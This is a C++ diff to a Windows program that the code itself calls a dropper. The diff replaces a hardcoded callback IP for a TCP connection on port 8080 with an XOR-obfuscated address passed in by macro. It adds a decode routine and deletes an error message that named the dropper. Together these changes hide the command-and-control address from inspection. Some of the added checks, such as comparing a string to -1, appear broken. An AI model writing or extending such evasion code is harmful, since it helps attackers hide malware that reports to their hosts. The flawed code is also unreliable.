@@ -18,8 +18,12 @@
 #endif
 
 #ifndef IPADDR
-#define IPADDR "192.168.79.139"
+#define IPADDR -1 // This should be impossible
 #endif 
+
+#ifndef IPXOR
+#define IPXOR -1 // This should be impossible
+#endif
 
 #ifndef POWERSHELL
 #define POWERSHELL 0
@@ -110,7 +114,6 @@ int main()
 
 	int result = send_message(message);
 	if (result == 1) {
-		std::cerr << "The dropper didn't send the tcp output";
 		return result;
 	}
 
@@ -189,6 +192,16 @@ int main()
 }
 
 
+std::string decode_ip( std::string ip, int xor_key) {
+
+	for (char &c : ip) {
+		c ^= xor_key;
+	}
+
+	return ip;
+
+}
+
 int send_message(std::string client_message) {
 
 	WSADATA wsaData;
@@ -207,7 +220,23 @@ int send_message(std::string client_message) {
 	client_addr.sin_family = AF_INET;
 	client_addr.sin_port = htons(8080);
 
-	if (inet_pton(AF_INET, IPADDR, &client_addr.sin_addr) != 1) {
+
+	const int xor_key = IPXOR;
+	std::string addr = IPADDR;
+
+	if (addr.c_str() == -1) {
+		std::cout << "Ip address macro was not pushed correctly\n";
+		return 1;
+	}
+
+	if (xor_key == -1) {
+		std:: cout << "The xor key macro was not passed correctly\n";
+		return 1;
+	}
+
+	std::string ip_addr = decode_ip(addr, xor_key);
+
+	if (inet_pton(AF_INET, ip_addr.c_str(), &client_addr.sin_addr) != 1) {
 		std::cerr << "inet_pton failed";
 		closesocket(client_connect);
 		WSACleanup();
